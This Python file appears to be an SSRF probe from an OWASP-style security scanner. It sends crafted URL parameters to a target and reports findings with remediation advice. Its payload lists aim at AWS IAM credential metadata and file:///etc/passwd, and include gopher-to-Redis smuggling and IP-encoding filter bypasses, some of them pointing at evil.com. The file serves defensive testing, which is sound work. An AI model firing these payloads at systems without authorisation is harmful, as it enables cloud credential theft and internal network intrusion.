"""
A10:2021 — Server-Side Request Forgery (SSRF)

Tests:
  1. Internal network probing via URL parameters (http://localhost, 127.0.0.1, 169.254.x.x)
  2. Cloud metadata endpoint access (AWS IMDSv1 at 169.254.169.254)
  3. DNS rebinding attack surface (out-of-band via burp collaborator pattern)
  4. URL redirect chains
  5. Protocol smuggling (file://, dict://, gopher://)
  6. Bypass techniques: DNS rebinding, decimal IP, IPv6, URL encoding

SSRF is the #10 risk in OWASP 2021 and was the root cause of several
high-profile cloud provider breaches including the Capital One breach (2019).

CWE-918: Server-Side Request Forgery
"""

from __future__ import annotations

import re
import httpx
from probe_suite.probes.base import (
    OWASPBaseProbe, OWASPFinding, OWASPCategory, Severity
)


class SSRFProbe(OWASPBaseProbe):
    name        = "ssrf"
    category    = OWASPCategory.A10_SSRF
    description = "Probes URL parameters for SSRF — internal network access, cloud metadata, protocol smuggling"

    # AWS/GCP/Azure metadata endpoints (the holy grail of SSRF)
    METADATA_URLS = [
        ("http://169.254.169.254/latest/meta-data/",              "AWS IMDSv1"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"),
        ("http://metadata.google.internal/computeMetadata/v1/",   "GCP metadata"),
        ("http://169.254.169.254/metadata/instance",              "Azure IMDS"),
    ]

    # Internal network targets
    INTERNAL_TARGETS = [
        ("http://localhost",            "localhost"),
        ("http://127.0.0.1",           "IPv4 loopback"),
        ("http://[::1]",               "IPv6 loopback"),
        ("http://0.0.0.0",             "0.0.0.0"),
        ("http://localhost:22",         "localhost SSH"),
        ("http://localhost:6379",       "Redis"),
        ("http://localhost:5432",       "PostgreSQL"),
        ("http://localhost:3306",       "MySQL"),
        ("http://localhost:27017",      "MongoDB"),
        ("http://10.0.0.1",            "Private 10.x"),
        ("http://192.168.1.1",         "Private 192.168.x"),
        ("http://172.16.0.1",          "Private 172.16.x"),
    ]

    # Bypass techniques
    BYPASS_VARIANTS = [
        ("http://2130706433",           "Decimal IP (127.0.0.1)"),
        ("http://0x7f000001",           "Hex IP (127.0.0.1)"),
        ("http://127.1",               "Short loopback"),
        ("http://127.000.000.001",      "Octal-padded loopback"),
        ("http://localhost%00.evil.com","Null byte bypass"),
        ("http://evil.com@localhost",   "@ bypass"),
    ]

    # Protocol smuggling
    PROTOCOL_PAYLOADS = [
        ("file:///etc/passwd",          "Local file read"),
        ("file:///etc/hosts",           "Hosts file"),
        ("dict://localhost:11211/",     "Memcached"),
        ("gopher://localhost:6379/_PING", "Redis via Gopher"),
        ("ftp://localhost",             "FTP"),
    ]

    # URL parameter names commonly used for external requests
    URL_PARAM_NAMES = [
        "url", "uri", "href", "src", "target", "redirect",
        "callback", "webhook", "endpoint", "host", "destination",
        "return_url", "next", "continue", "image_url", "avatar_url",
        "feed_url", "proxy", "forward",
    ]

    def run(
        self,
        base_url: str,
        session: httpx.Client,
        oob_domain: str = None,
        **kwargs,
    ) -> list[OWASPFinding]:
        findings = []
        base = base_url.rstrip("/")

        findings.extend(self._probe_url_parameters(base, session))
        findings.extend(self._test_metadata_endpoints(base, session))
        findings.extend(self._test_protocol_smuggling(base, session))
        findings.extend(self._test_bypass_variants(base, session))

        return findings

    def _probe_url_parameters(
        self, base: str, session: httpx.Client
    ) -> list[OWASPFinding]:
        """
        Discover endpoints that accept URL parameters and test them for SSRF.
        Uses a safe internal URL that would only resolve on the server side.
        """
        findings = []
        test_endpoints = [
            "/api/fetch", "/api/proxy", "/api/preview",
            "/api/screenshot", "/api/import", "/webhook",
            "/api/v1/fetch", "/api/thumbnail",
        ]

        ssrf_probes = [
            ("http://169.254.169.254/", "AWS metadata probe"),
            ("http://localhost/",        "localhost probe"),
            ("http://127.0.0.1/",        "loopback probe"),
        ]

        for path in test_endpoints:
            for param_name in self.URL_PARAM_NAMES[:5]:  # Limit iterations
                for url_payload, description in ssrf_probes[:2]:
                    try:
                        resp = session.get(
                            f"{base}{path}",
                            params={param_name: url_payload},
                        )
                        # If the server made the request, it may return metadata content
                        body = resp.text[:1000]
                        if self._contains_metadata_response(body):
                            findings.append(OWASPFinding(
                                probe=self.name,
                                owasp_category=self.category,
                                severity=Severity.CRITICAL,
                                title=f"SSRF confirmed — cloud metadata accessible via {param_name} parameter",
                                detail=(
                                    f"Parameter '{param_name}' at {path} returned cloud metadata content "
                                    f"when pointed at {url_payload}. "
                                    "An attacker can steal cloud provider credentials and pivot to the internal network."
                                ),
                                evidence=body[:500],
                                request_url=f"{base}{path}?{param_name}={url_payload}",
                                request_method="GET",
                                status_code=resp.status_code,
                                remediation=(
                                    "Block all requests to RFC 1918 and link-local addresses. "
                                    "Use an allowlist of permitted external domains. "
                                    "Disable IMDSv1 on AWS; require IMDSv2 with session tokens."
                                ),
                                cwe_id="CWE-918",
                                cvss_score=9.8,
                            ))
                        elif resp.status_code == 200 and len(body) > 100:
                            # Server responded to a request to an internal address
                            findings.append(OWASPFinding(
                                probe=self.name,
                                owasp_category=self.category,
                                severity=Severity.HIGH,
                                title=f"Potential SSRF — server responded to internal URL via '{param_name}'",
                                detail=(
                                    f"Sending {url_payload} as '{param_name}' to {path} returned "
                                    f"HTTP 200 with {len(body)} bytes. The server may have made "
                                    "an outbound request to this internal address."
                                ),
                                evidence=body[:200],
                                request_url=f"{base}{path}?{param_name}={url_payload}",
                                request_method="GET",
                                status_code=resp.status_code,
                                remediation=(
                                    "Validate and sanitise all URL parameters. "
                                    "Resolve hostnames and block RFC 1918 ranges before making requests."
                                ),
                                cwe_id="CWE-918",
                                cvss_score=8.6,
                            ))
                    except Exception:
                        pass

        return findings

    def _test_metadata_endpoints(
        self, base: str, session: httpx.Client
    ) -> list[OWASPFinding]:
        """
        Test if the server proxies requests to cloud metadata endpoints.
        """
        findings = []
        for metadata_url, service in self.METADATA_URLS:
            for param_name in ["url", "uri", "callback", "target"]:
                try:
                    resp = session.get(
                        f"{base}/api/fetch",
                        params={param_name: metadata_url},
                    )
                    if resp.status_code == 200 and self._contains_metadata_response(resp.text):
                        findings.append(OWASPFinding(
                            probe=self.name,
                            owasp_category=self.category,
                            severity=Severity.CRITICAL,
                            title=f"SSRF: {service} metadata returned via '{param_name}' parameter",
                            detail=(
                                f"The API fetched {metadata_url} and returned its contents. "
                                f"This exposes {service} instance metadata including IAM credentials, "
                                "VPC configuration, and instance identity documents."
                            ),
                            evidence=resp.text[:400],
                            request_url=f"{base}/api/fetch?{param_name}={metadata_url}",
                            request_method="GET",
                            status_code=resp.status_code,
                            remediation=(
                                "Block 169.254.0.0/16 (link-local) at the network level. "
                                "Upgrade to IMDSv2 on AWS (requires session token — not vulnerable to SSRF)."
                            ),
                            cwe_id="CWE-918",
                            cvss_score=9.9,
                        ))
                except Exception:
                    pass

        return findings

    def _test_protocol_smuggling(
        self, base: str, session: httpx.Client
    ) -> list[OWASPFinding]:
        findings = []
        for proto_url, description in self.PROTOCOL_PAYLOADS:
            for param_name in ["url", "uri", "src"]:
                try:
                    resp = session.get(f"{base}/api/fetch", params={param_name: proto_url})
                    if resp.status_code == 200 and len(resp.text) > 10:
                        # If file:// works and returns content
                        if proto_url.startswith("file://") and "root:" in resp.text:
                            findings.append(OWASPFinding(
                                probe=self.name,
                                owasp_category=self.category,
                                severity=Severity.CRITICAL,
                                title=f"SSRF via file:// protocol — local file read confirmed",
                                detail=(
                                    "/etc/passwd content returned via file:// URL. "
                                    "An attacker can read any file the application process has access to."
                                ),
                                evidence=resp.text[:300],
                                request_url=f"{base}/api/fetch?{param_name}={proto_url}",
                                request_method="GET",
                                status_code=resp.status_code,
                                remediation=(
                                    "Whitelist allowed URL schemes (https:// only). "
                                    "Block file://, dict://, gopher://, ftp:// schemes explicitly."
                                ),
                                cwe_id="CWE-918",
                                cvss_score=9.9,
                            ))
                except Exception:
                    pass

        return findings

    def _test_bypass_variants(
        self, base: str, session: httpx.Client
    ) -> list[OWASPFinding]:
        """Test common SSRF filter bypass techniques."""
        findings = []
        for bypass_url, description in self.BYPASS_VARIANTS[:4]:
            for param_name in ["url", "uri"]:
                try:
                    resp = session.get(f"{base}/api/fetch", params={param_name: bypass_url})
                    if resp.status_code == 200 and len(resp.text) > 50:
                        findings.append(OWASPFinding(
                            probe=self.name,
                            owasp_category=self.category,
                            severity=Severity.HIGH,
                            title=f"SSRF filter bypassed using {description}",
                            detail=(
                                f"Bypass technique '{description}' ({bypass_url}) returned HTTP 200. "
                                "The SSRF filter can be circumvented using IP encoding variants."
                            ),
                            evidence=f"Payload: {bypass_url} → HTTP 200",
                            request_url=f"{base}/api/fetch?{param_name}={bypass_url}",
                            request_method="GET",
                            status_code=resp.status_code,
                            remediation=(
                                "Resolve hostnames to IPs and block at the IP level, not hostname level. "
                                "Normalise URLs before validation to catch encoding bypasses."
                            ),
                            cwe_id="CWE-918",
                            cvss_score=8.8,
                        ))
                except Exception:
                    pass

        return findings

    @staticmethod
    def _contains_metadata_response(body: str) -> bool:
        """Check if response body looks like cloud metadata content."""
        metadata_indicators = [
            "ami-id", "instance-id", "instance-type",   # AWS
            "project/project-id", "instance/hostname",  # GCP
            "compute/location",                          # Azure
            "security-credentials",                      # AWS IAM
            "AccessKeyId", "SecretAccessKey",            # AWS creds
        ]
        return any(indicator.lower() in body.lower() for indicator in metadata_indicators)
